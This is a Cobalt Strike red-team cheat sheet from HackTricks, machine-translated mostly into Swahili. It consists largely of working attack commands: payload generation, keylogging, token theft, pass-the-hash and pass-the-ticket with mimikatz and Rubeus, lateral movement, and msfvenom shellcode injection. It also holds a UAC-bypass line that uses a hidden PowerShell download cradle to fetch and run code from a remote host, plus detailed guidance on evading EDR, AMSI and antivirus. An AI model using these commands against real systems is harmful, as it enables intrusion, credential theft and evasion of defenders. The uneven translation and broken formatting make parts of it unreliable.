# Cobalt Strike

{{#include /banners/hacktricks-training.md}}

### Listeners

### C2 Listeners

`Cobalt Strike -> Listeners -> Add/Edit` kisha unaweza kuchagua wapi kusikiliza, ni aina gani ya beacon ya kutumia (http, dns, smb...) na zaidi.

### Peer2Peer Listeners

Beacons za wasikilizaji hawa hazihitaji kuzungumza na C2 moja kwa moja, wanaweza kuwasiliana nayo kupitia beacons nyingine.

`Cobalt Strike -> Listeners -> Add/Edit` kisha unahitaji kuchagua TCP au SMB beacons

* **Beacon ya TCP itaanzisha msikilizaji katika bandari iliyochaguliwa**. Kuungana na beacon ya TCP tumia amri `connect <ip> <port>` kutoka beacon nyingine
* **Beacon ya smb itasikiliza katika pipename yenye jina lililochaguliwa**. Kuungana na beacon ya SMB unahitaji kutumia amri `link [target] [pipe]`.

### Generate & Host payloads

#### Generate payloads in files

`Attacks -> Packages ->`

* **`HTMLApplication`** kwa ajili ya faili za HTA
* **`MS Office Macro`** kwa hati ya ofisi yenye macro
* **`Windows Executable`** kwa .exe, .dll au huduma .exe
* **`Windows Executable (S)`** kwa **stageless** .exe, .dll au huduma .exe (bora stageless kuliko staged, chini ya IoCs)

#### Generate & Host payloads

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` Hii itazalisha script/executable ya kupakua beacon kutoka cobalt strike katika fomati kama: bitsadmin, exe, powershell na python

#### Host Payloads

Ikiwa tayari una faili unayotaka kuhifadhi kwenye seva ya wavuti nenda tu kwa `Attacks -> Web Drive-by -> Host File` na uchague faili ya kuhifadhi na usanidi wa seva ya wavuti.

### Beacon Options

<pre class="language-bash"><code class="lang-bash"># Execute local .NET binary
execute-assembly </path/to/executable.exe>
# Kumbuka kwamba ili kupakia assemblies kubwa zaidi ya 1MB, mali ya 'tasks_max_size' ya profaili ya malleable inahitaji kubadilishwa.

# Screenshots
printscreen    # Chukua picha moja kupitia njia ya PrintScr
screenshot     # Chukua picha moja
screenwatch    # Chukua picha za kawaida za desktop
## Nenda kwa View -> Screenshots kuziangalia

# keylogger
keylogger [pid] [x86|x64]
## View > Keystrokes kuangalia funguo zilizopigwa

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Ingiza hatua ya portscan ndani ya mchakato mwingine
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
## Import Powershell module
powershell-import C:\path\to\PowerView.ps1
powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
powershell <andika amri ya powershell hapa> # Hii inatumia toleo la juu zaidi linaloungwa mkono la powershell (sio oppsec)
powerpick <cmdlet> <args> # Hii inaunda mchakato wa dhabihu ulioainishwa na spawnto, na kuingiza UnmanagedPowerShell ndani yake kwa ajili ya opsec bora (sio logging)
powerpick Invoke-PrivescAudit | fl
psinject <pid> <arch> <commandlet> <arguments> # Hii inachoma UnmanagedPowerShell ndani ya mchakato ulioainishwa ili kuendesha cmdlet ya PowerShell.


# User impersonation
## Token generation with creds
make_token [DOMAIN\user] [password] #Unda token ili kuiga mtumiaji katika mtandao
ls \\computer_name\c$ # Jaribu kutumia token iliyoundwa kufikia C$ katika kompyuta
rev2self # Acha kutumia token iliyoundwa na make_token
## Matumizi ya make_token yanazalisha tukio 4624: Akaunti ilifanikiwa kuingia. Tukio hili ni la kawaida sana katika eneo la Windows, lakini linaweza kupunguzika kwa kuchuja kwa Aina ya Kuingia. Kama ilivyotajwa hapo juu, inatumia LOGON32_LOGON_NEW_CREDENTIALS ambayo ni aina ya 9.

# UAC Bypass
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Steal token from pid
## Kama make_token lakini kuiba token kutoka kwa mchakato
steal_token [pid] # Pia, hii ni muhimu kwa hatua za mtandao, sio hatua za ndani
## Kutoka kwa hati ya API tunajua kwamba aina hii ya kuingia "inaruhusu mwito kuiga token yake ya sasa". Hii ndiyo sababu matokeo ya Beacon yanasema Imersonated <current_username> - inaimarisha token yetu iliyokopwa.
ls \\computer_name\c$ # Jaribu kutumia token iliyoundwa kufikia C$ katika kompyuta
rev2self # Acha kutumia token kutoka steal_token

## Launch process with nwe credentials
spawnas [domain\username] [password] [listener] #Fanya hivyo kutoka kwenye saraka yenye ruhusa ya kusoma kama: cd C:\
## Kama make_token, hii itazalisha tukio la Windows 4624: Akaunti ilifanikiwa kuingia lakini kwa aina ya kuingia ya 2 (LOGON32_LOGON_INTERACTIVE). Itabainisha mtumiaji anayepiga simu (TargetUserName) na mtumiaji anayeghushi (TargetOutboundUserName).

## Inject into process
inject [pid] [x64|x86] [listener]
## Kutoka kwa mtazamo wa OpSec: Usifanye kuingiza kati ya majukwaa isipokuwa unahitaji sana (mfano x86 -> x64 au x64 -> x86).

## Pass the hash
## Mchakato huu wa mabadiliko unahitaji kubadilisha kumbukumbu ya LSASS ambayo ni hatua ya hatari kubwa, inahitaji ruhusa za admin za ndani na sio rahisi sana ikiwa Mchakato Uliolindwa Mwanga (PPL) umewezeshwa.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pass the hash through mimikatz
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## Bila /run, mimikatz itazalisha cmd.exe, ikiwa unakimbia kama mtumiaji mwenye Desktop, ataona shell (ikiwa unakimbia kama SYSTEM uko sawa)
steal_token <pid> #Iba token kutoka kwa mchakato ulioanzishwa na mimikatz

## Pass the ticket
## Omba tiketi
execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## Unda kikao kipya cha kuingia ili kutumia tiketi mpya (ili usifute ile iliyovunjwa)
make_token <domain>\<username> DummyPass
## Andika tiketi kwenye mashine ya mshambuliaji kutoka kwa kikao cha poweshell & ipakie
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass the ticket from SYSTEM
## Unda mchakato mpya na tiketi
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Iba token kutoka kwa mchakato huo
steal_token <pid>

## Extract ticket + Pass the ticket
### List tickets
execute-assembly C:\path\Rubeus.exe triage
### Dump insteresting ticket by luid
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### Create new logon session, note luid and processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Insert ticket in generate logon session
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Finally, steal the token from that new process
steal_token <pid>

# Lateral Movement
## Ikiwa token iliumbwa itatumika
jump [method] [target] [listener]
## Njia:
## psexec                    x86   Tumia huduma kuendesha kipande cha huduma EXE
## psexec64                  x64   Tumia huduma kuendesha kipande cha huduma EXE
## psexec_psh                x86   Tumia huduma kuendesha PowerShell one-liner
## winrm                     x86   Endesha script ya PowerShell kupitia WinRM
## winrm64                   x64   Endesha script ya PowerShell kupitia WinRM
## wmi_msbuild               x64   wmi lateral movement na msbuild inline c# task (oppsec)


remote-exec [method] [target] [command] # remote-exec hairudishi matokeo
## Njia:
## psexec                          Remote execute kupitia Service Control Manager
## winrm                           Remote execute kupitia WinRM (PowerShell)
## wmi                             Remote execute kupitia WMI

## Ili kuendesha beacon na wmi (haipo katika amri ya jump) pakua tu beacon na uendeshe
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Pass session to Metasploit - Through listener
## Kwenye mwenyeji wa metaploit
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## Kwenye cobalt: Listeners > Ongeza na weka Payload kuwa Foreign HTTP. Weka Host kuwa 10.10.5.120, Bandari kuwa 8080 na bonyeza Hifadhi.
beacon> spawn metasploit
## Unaweza tu kuanzisha vikao vya x86 Meterpreter na msikilizaji wa kigeni.

# Pass session to Metasploit - Through shellcode injection
## Kwenye mwenyeji wa metasploit
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
## Endesha msfvenom na uandae msikilizaji wa multi/handler

## Nakili faili ya bin kwenye mwenyeji wa cobalt strike
ps
shinject <pid> x64 C:\Payloads\msf.bin #Ingiza shellcode ya metasploit katika mchakato wa x64

# Pass metasploit session to cobalt strike
## Fenerate stageless Beacon shellcode, nenda kwa Attacks > Packages > Windows Executable (S), chagua msikilizaji unaotaka, chagua Raw kama aina ya Matokeo na chagua Tumia payload ya x64.
## Tumia post/windows/manage/shellcode_inject katika metasploit kuingiza shellcode iliyozalishwa ya cobalt strike


# Pivoting
## Fungua proxy ya socks katika teamserver
beacon> socks 1080

# SSH connection
beacon> ssh 10.10.17.12:22 username password</code></pre>

## Opsec

### Execute-Assembly

**`execute-assembly`** inatumia **mchakato wa dhabihu** kwa kutumia kuingiza mchakato wa mbali kuendesha programu iliyoonyeshwa. Hii ni kelele sana kwani kuingiza ndani ya mchakato APIs fulani za Win zinatumika ambazo kila EDR inakagua. Hata hivyo, kuna zana za kawaida ambazo zinaweza kutumika kupakia kitu katika mchakato sawa:

- [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
- Katika Cobalt Strike unaweza pia kutumia BOF (Beacon Object Files): [https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)

Script ya agressor `https://github.com/outflanknl/HelpColor` itaunda amri ya `helpx` katika Cobalt Strike ambayo itaweka rangi katika amri ikionyesha ikiwa ni BOFs (kijani), ikiwa ni Frok&Run (njano) na kadhalika, au ikiwa ni ProcessExecution, kuingiza au sawa (nyekundu). Ambayo inasaidia kujua ni amri zipi ziko stealthy zaidi.

### Act as the user

Unaweza kuangalia matukio kama `Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents`:

- Usalama EID 4624 - Angalia kuingia kwa mwingiliano wote ili kujua masaa ya kawaida ya kazi.
- Mfumo EID 12,13 - Angalia mara za kuzima/kuzindua/usingizi.
- Usalama EID 4624/4625 - Angalia majaribio halali/siyo halali ya NTLM.
- Usalama EID 4648 - Tukio hili linaundwa wakati akidi za maandiko zinapotumika kuingia. Ikiwa mchakato umeunda, binary hiyo ina uwezekano wa kuwa na akidi hizo wazi katika faili ya usanidi au ndani ya msimbo.

Unapotumia `jump` kutoka cobalt strike, ni bora kutumia njia ya `wmi_msbuild` ili kufanya mchakato mpya uonekane halali zaidi.

### Use computer accounts

Ni kawaida kwa walinzi kuangalia tabia za ajabu zinazozalishwa na watumiaji na **kuondoa akaunti za huduma na akaunti za kompyuta kama `*$` kutoka kwa ufuatiliaji wao**. Unaweza kutumia akaunti hizi kufanya harakati za pembeni au kupandisha hadhi.

### Use stageless payloads

Payloads zisizo na hatua ni kelele kidogo kuliko zile zenye hatua kwa sababu hazihitaji kupakua hatua ya pili kutoka kwa seva ya C2. Hii inamaanisha kwamba hazizalishi trafiki yoyote ya mtandao baada ya muunganisho wa awali, na kufanya kuwa na uwezekano mdogo wa kugunduliwa na ulinzi wa mtandao.

### Tokens & Token Store

Kuwa makini unapoiba au kuunda token kwa sababu inaweza kuwa na uwezekano kwa EDR kuhesabu token zote za nyuzi zote na kupata **token inayomilikiwa na mtumiaji tofauti** au hata SYSTEM katika mchakato.

Hii inaruhusu kuhifadhi token **kwa beacon** ili sio lazima kuiba token hiyo tena na tena. Hii ni muhimu kwa harakati za pembeni au wakati unahitaji kutumia token iliyibwa mara nyingi:

- token-store steal <pid>
- token-store steal-and-use <pid>
- token-store show
- token-store use <id>
- token-store remove <id>
- token-store remove-all

Unapohamia kwa pembeni, kawaida ni bora **kuiba token kuliko kuunda mpya** au kufanya shambulio la kupitisha hash.

### Guardrails

Cobalt Strike ina kipengele kinachoitwa **Guardrails** ambacho husaidia kuzuia matumizi ya amri au hatua fulani ambazo zinaweza kugunduliwa na walinzi. Guardrails zinaweza kuwekewa mipangilio kuzuia amri maalum, kama vile `make_token`, `jump`, `remote-exec`, na nyinginezo ambazo hutumiwa mara kwa mara kwa harakati za pembeni au kupandisha hadhi.

Zaidi ya hayo, repo [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks) pia ina baadhi ya ukaguzi na mawazo unayoweza kuzingatia kabla ya kutekeleza payload.

### Tickets encryption

Katika AD kuwa makini na usimbaji wa tiketi. Kawaida, zana fulani zitatumia usimbaji wa RC4 kwa tiketi za Kerberos, ambayo ni salama kidogo kuliko usimbaji wa AES na kwa kawaida mazingira ya kisasa yatatumia AES. Hii inaweza kugunduliwa na walinzi wanaofuatilia algorithimu dhaifu za usimbaji.

### Avoid Defaults

Unapotumia Cobalt Strike kwa kawaida mabomba ya SMB yatakuwa na jina `msagent_####` na `"status_####`. Badilisha majina hayo. Inawezekana kuangalia majina ya mabomba yaliyopo kutoka Cobalt Strike kwa amri: `ls \\.\pipe\`

Zaidi ya hayo, na vikao vya SSH bomba linaloitwa `\\.\pipe\postex_ssh_####` linaanzishwa. Badilisha kwa `set ssh_pipename "<new_name>";`.

Pia katika shambulio la poext exploitation mabomba `\\.\pipe\postex_####` yanaweza kubadilishwa kwa `set pipename "<new_name>"`.

Katika profaili za Cobalt Strike unaweza pia kubadilisha mambo kama:

- Kuepuka kutumia `rwx`
- Jinsi tabia ya kuingiza mchakato inavyofanya kazi (ni APIs zipi zitakazotumika) katika block ya `process-inject {...}`
- Jinsi "fork and run" inavyofanya kazi katika block ya `post-ex {…}`
- Wakati wa usingizi
- Ukubwa wa juu wa binaries zinazoweza kupakiwa kwenye kumbukumbu
- Alama ya kumbukumbu na maudhui ya DLL na block ya `stage {...}`
- Trafiki ya mtandao

### Bypass memory scanning

Baadhi ya EDRs zinakagua kumbukumbu kwa baadhi ya saini za malware zinazojulikana. Coblat Strike inaruhusu kubadilisha kazi ya `sleep_mask` kama BOF ambayo itakuwa na uwezo wa kusimbua katika kumbukumbu backdoor.

### Noisy proc injections

Wakati wa kuingiza msimbo katika mchakato hii kwa kawaida ni kelele sana, hii ni kwa sababu **hakuna mchakato wa kawaida kwa kawaida unafanya hatua hii na kwa sababu njia za kufanya hivyo ni chache sana**. Hivyo, inaweza kugunduliwa na mifumo ya kugundua inayotegemea tabia. Aidha, inaweza pia kugunduliwa na EDRs zinazoskania mtandao kwa **nyuzi zinazohusisha msimbo ambao haupo kwenye diski** (ingawa michakato kama vivinjari vinavyotumia JIT vina hii kawaida). Mfano: [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)

### Spawnas | PID and PPID relationships

Unapozalisha mchakato mpya ni muhimu **kuhifadhi uhusiano wa kawaida wa mzazi-na-mwana** kati ya michakato ili kuepuka kugunduliwa. Ikiwa svchost.exec inatekeleza iexplorer.exe itakuwa na shaka, kwani svchost.exe si mzazi wa iexplorer.exe katika mazingira ya kawaida ya Windows.

Wakati beacon mpya inazalishwa katika Cobalt Strike kwa kawaida mchakato unaotumia **`rundll32.exe`** unaundwa ili kuendesha msikilizaji mpya. Hii si stealthy sana na inaweza kugunduliwa kwa urahisi na EDRs. Zaidi ya hayo, `rundll32.exe` inakimbia bila args yoyote ikifanya kuwa na shaka zaidi.

Kwa amri ifuatayo ya Cobalt Strike, unaweza kubainisha mchakato tofauti ili kuanzisha beacon mpya, na kuifanya iwe ngumu kugundua:
```bash
spawnto x86 svchost.exe
```
You can aso change this setting **`spawnto_x86` and `spawnto_x64`** in a profile.

### Proxying attackers traffic

Wakati mwingine washambuliaji watahitaji kuwa na uwezo wa kukimbia zana kwa ndani, hata kwenye mashine za linux na kufanya trafiki ya waathirika ifikie zana (e.g. NTLM relay).

Zaidi ya hayo, wakati mwingine kufanya shambulio la pass-the-hash au pass-the-ticket ni rahisi zaidi kwa mshambuliaji **kuongeza hash hii au tiketi katika mchakato wake wa LSASS** kwa ndani na kisha kuhamasisha kutoka hapo badala ya kubadilisha mchakato wa LSASS wa mashine ya mwathirika.

Hata hivyo, unahitaji kuwa **makini na trafiki inayozalishwa**, kwani unaweza kuwa unatumia trafiki isiyo ya kawaida (kerberos?) kutoka kwa mchakato wako wa backdoor. Kwa hili unaweza kuhamasisha kwenye mchakato wa kivinjari (ingawa unaweza kukamatwa ukiingiza mwenyewe kwenye mchakato hivyo fikiria njia ya siri ya kufanya hivi).
```bash

### Avoiding AVs

#### AV/AMSI/ETW Bypass

Check the page:

{{#ref}}
av-bypass.md
{{#endref}}


#### Artifact Kit

Usually in `/opt/cobaltstrike/artifact-kit` you can find the code and pre-compiled templates (in `/src-common`) of the payloads that cobalt strike is going to use to generate the binary beacons.

Using [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) with the generated backdoor (or just with the compiled template) you can find what is making defender trigger. It's usually a string. Therefore you can just modify the code that is generating the backdoor so that string doesn't appear in the final binary.

After modifying the code just run `./build.sh` from the same directory and copy the `dist-pipe/` folder into the Windows client in `C:\Tools\cobaltstrike\ArtifactKit`.

```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```

Don't forget to load the aggressive script `dist-pipe\artifact.cna` to indicate Cobalt Strike to use the resources from disk that we want and not the ones loaded.

#### Resource Kit

The ResourceKit folder contains the templates for Cobalt Strike's script-based payloads including PowerShell, VBA and HTA.

Using [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) with the templates you can find what is defender (AMSI in this case) not liking and modify it:

```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```

Modifying the detected lines one can generate a template that won't be caught.

Don't forget to load the aggressive script `ResourceKit\resources.cna` to indicate Cobalt Strike to luse the resources from disk that we want and not the ones loaded.

#### Function hooks | Syscall

Function hooking is a very common method of ERDs to detect malicious activity. Cobalt Strike allows you to bypass these hooks by using **syscalls** instead of the standard Windows API calls using the **`None`** config, or use the `Nt*` version of a function with the **`Direct`** setting, or just jumping over the `Nt*` function with the **`Indirect`** option in the malleable profile. Depending on the system, an optino might be more stealth then the other.

This can be set in the profile or suing the command **`syscall-method`**

However, this could also be noisy.

Some option granted by Cobalt Strike to bypass function hooks is to remove those hooks with: [**unhook-bof**](https://github.com/Cobalt-Strike/unhook-bof).

You could also check with functions are hooked with [**https://github.com/Mr-Un1k0d3r/EDRs**](https://github.com/Mr-Un1k0d3r/EDRs) or [**https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector**](https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector)




```bash
cd C:\Tools\neo4j\bin  
neo4j.bat console  
http://localhost:7474/ --> Badilisha nenosiri  
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL  

# Badilisha powershell  
C:\Tools\cobaltstrike\ResourceKit  
template.x64.ps1  
# Badilisha $var_code -> $polop  
# $x --> $ar  
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna  

#artifact kit  
cd  C:\Tools\cobaltstrike\ArtifactKit  
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```


{{#include /banners/hacktricks-training.md}}
